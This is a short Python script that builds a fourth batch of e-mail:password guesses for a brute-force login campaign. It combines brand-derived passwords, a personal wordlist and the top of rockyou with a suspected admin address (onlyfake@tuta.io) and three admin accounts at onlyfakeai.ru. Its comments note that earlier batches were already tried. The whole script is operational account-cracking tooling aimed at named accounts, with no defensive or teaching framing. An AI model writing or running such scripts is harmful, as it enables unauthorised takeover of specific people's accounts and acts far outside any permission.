#!/usr/bin/env python3
"""Queue v4: broaden the most likely admin identity (onlyfake@tuta.io) across brand + rockyou,
then widen the 3 admin-domain e-mails."""
import gzip, os

brand = [l.rstrip("\n") for l in open("/tmp/ops_pw.txt", encoding="utf-8", errors="ignore") if l.strip()][:3000]
personal = [l.rstrip("\n") for l in open("/tmp/ops_queue.txt", encoding="utf-8", errors="ignore") if l.strip()][:2027]
rockyou = []
with gzip.open("/usr/share/wordlists/rockyou.txt.gz", "rt", encoding="latin-1", errors="ignore") as f:
    for i, line in enumerate(f):
        if i >= 1000:
            break
        p = line.rstrip("\n")
        if 6 <= len(p) <= 24:
            rockyou.append(p)

rows = []
# 1) tuta: brand tail (400..3000) + rockyou 1000
for pw in brand[400:]:
    rows.append(f"onlyfake@tuta.io:{pw}")
for pw in rockyou:
    rows.append(f"onlyfake@tuta.io:{pw}")
# 2) admin-domain e-mails: brand tail 600..3000 (first 600 already done in queue3)
admin_emails = ["admin@onlyfakeai.ru", "support@onlyfakeai.ru", "onlyfake@onlyfakeai.ru"]
for e in admin_emails:
    for pw in brand[600:]:
        rows.append(f"{e}:{pw}")
# 3) admin-domain e-mails: rockyou
for e in admin_emails:
    for pw in rockyou:
        rows.append(f"{e}:{pw}")

seen = set(); out = []
for r in rows:
    if r not in seen:
        seen.add(r); out.append(r)
open("/tmp/ops_queue4.txt", "w", encoding="utf-8").write("\n".join(out) + "\n")
print("queue4 rows:", len(out), "| tuta brand tail:", len(brand[400:]), "| rockyou:", len(rockyou))
print("first 3:", out[:3])
